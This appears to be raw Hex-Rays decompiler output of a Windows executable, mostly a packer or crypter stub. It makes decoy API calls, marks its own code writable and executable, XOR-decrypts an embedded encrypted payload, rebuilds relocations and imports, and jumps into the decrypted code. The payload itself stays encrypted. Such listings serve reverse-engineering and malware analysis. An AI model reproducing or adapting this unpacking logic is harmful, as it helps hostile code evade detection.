/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// void __usercall __noreturn start(int a1@<esi>);
// BOOL __stdcall AddAce(PACL pAcl, DWORD dwAceRevision, DWORD dwStartingAceIndex, LPVOID pAceList, DWORD nAceListLength);
// BOOL __stdcall AreAllAccessesGranted(DWORD GrantedAccess, DWORD DesiredAccess);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);

//-------------------------------------------------------------------------
// Data declarations

char byte_401288[] = { 'G' }; // weak
_UNKNOWN loc_401A68; // weak
int dword_402588[158] =
{
  -974303741,
  -2061161356,
  1411111815,
  -2050026701,
  -540628275,
  1320986862,
  -2061743938,
  2111706192,
  525727243,
  -585125587,
  352408210,
  -1342995751,
  -1379607839,
  1304841028,
  292651068,
  -219121389,
  -1307370617,
  1367989776,
  -2142235005,
  -604131706,
  1242803257,
  -2127868722,
  1980567677,
  350551511,
  -781795997,
  430399140,
  -1593339922,
  -1565010820,
  1107772629,
  519344023,
  -60065924,
  -1132391125,
  1595658387,
  -1898244035,
  -713252837,
  1204134329,
  -1932115677,
  1950227893,
  384958368,
  -750469311,
  458972326,
  -1552052803,
  -1592732133,
  1100367730,
  492604531,
  -14715669,
  -1076292013,
  1574031918,
  -1943463222,
  -676879627,
  1189912720,
  -1228128231,
  1308833670,
  748996085,
  -670452731,
  284514292,
  -1461811711,
  -1682317892,
  2066709955,
  663140044,
  -974303741,
  -2061161308,
  1725753645,
  -1221516839,
  -326854166,
  2109971385,
  -1228113105,
  1308829574,
  748996077,
  -382892763,
  567895772,
  -1712670927,
  -1682314108,
  2066709955,
  663140044,
  -974303741,
  -2061161308,
  1725753645,
  -1221516839,
  -326854166,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
char byte_404000[4096] =
{
  'Ì',
  '¶',
  '†',
  '\'',
  '\x03',
  'N',
  'í',
  'Å',
  '¤',
  ',',
  '%',
  '…',
  '-',
  'é',
  'Ü',
  'f',
  'Ù',
  '!',
  '1',
  '·',
  'ê',
  '™',
  '„',
  'ì',
  '¹',
  '›',
  'Ã',
  '}',
  '/',
  '{',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // idb


//----- (00401000) --------------------------------------------------------
void __usercall __noreturn start(int a1@<esi>)
{
  int v1; // ebx
  int v2; // edi
  int v3; // edx
  int v4; // ecx
  unsigned int v5; // eax
  int *v6; // ecx
  unsigned int v7; // edi
  char *v8; // ebx
  char *v9; // esi
  _WORD *v10; // edx
  char *v11; // eax
  char *v12; // esi
  HMODULE v13; // ebp
  int v14; // edx
  int v15; // edi
  FARPROC *i; // esi
  int v17; // eax
  FARPROC v18; // eax
  bool v19; // zf
  DWORD flOldProtect; // [esp+10h] [ebp-8h] BYREF
  char *v21; // [esp+14h] [ebp-4h]

  v1 = 0;
  v2 = AddAce(0, 0, 0, 0, 0) + 30;
  if ( !AreAllAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) )
    v2 ^= 0xEu;
  CloseHandle((HANDLE)0x59);
  VirtualProtect(start, 0x3000u, 0x40u, &flOldProtect);
  v5 = 0;
  while ( 1 )
  {
    v3 = v4 + 8 * v3;
    if ( v1 == v2 )
      v1 = 0;
    a1 += v1;
    LOBYTE(v4) = byte_404000[v1];
    byte_401288[v5++] ^= v4;
    ++v1;
    if ( v5 >= 0x1440 )
    {
      v6 = dword_402588;
      v7 = a1 + 8 * v2;
      v8 = &byte_401288[-640];
      v9 = 0;
      v21 = 0;
      while ( 1 )
      {
        v10 = v6 + 2;
        if ( (unsigned int)(v6[1] - 8) >> 1 )
        {
          v7 = (unsigned int)(v6[1] - 8) >> 1;
          do
          {
            if ( (*v10 & 0xF000) == 12288 )
            {
              v11 = &v8[*v6 + (*v10 & 0xFFF)];
              *(_DWORD *)v11 += &byte_401288[-268436096];
            }
            ++v10;
            --v7;
          }
          while ( v7 );
          v9 = v21;
        }
        v9 += v6[1];
        v21 = v9;
        v7 = (unsigned int)&v10[v7];
        v6 = (int *)((char *)v6 + v6[1]);
        if ( (unsigned int)v9 >= 0xE8 )
        {
          v12 = &byte_401288[2788];
          v21 = &byte_401288[2788];
          if ( *(_DWORD *)&byte_401288[2804] )
          {
            do
            {
              v13 = LoadLibraryA(&v8[*((_DWORD *)v12 + 3)]);
              v7 = v14 + 8 * v7;
              if ( v13 )
              {
                v15 = *(_DWORD *)v12;
                if ( !*(_DWORD *)v12 )
                  v15 = *((_DWORD *)v12 + 4);
                v7 = (unsigned int)&v8[v15];
                for ( i = (FARPROC *)&v8[*((_DWORD *)v12 + 4)]; *(_DWORD *)v7; ++i )
                {
                  v17 = *(_DWORD *)v7;
                  if ( *(int *)v7 >= 0 )
                    v18 = GetProcAddress(v13, &v8[v17 + 2]);
                  else
                    v18 = GetProcAddress(v13, (LPCSTR)(unsigned __int16)v17);
                  *i = v18;
                  v7 += 4;
                }
                v12 = v21;
              }
              v12 += 20;
              v19 = *((_DWORD *)v12 + 4) == 0;
              v21 = v12;
            }
            while ( !v19 );
          }
          ((void (*)(void))loc_401A68)();
          ExitProcess(0);
        }
      }
    }
  }
}
// 401051: variable 'v4' is possibly undefined
// 401051: variable 'v3' is possibly undefined
// 40110E: variable 'v14' is possibly undefined
// 402588: using guessed type int dword_402588[158];

// nfuncs=1 queued=1 decompiled=1 lumina nreq=0 worse=0 better=0
// ALL OK, 1 function(s) have been successfully decompiled
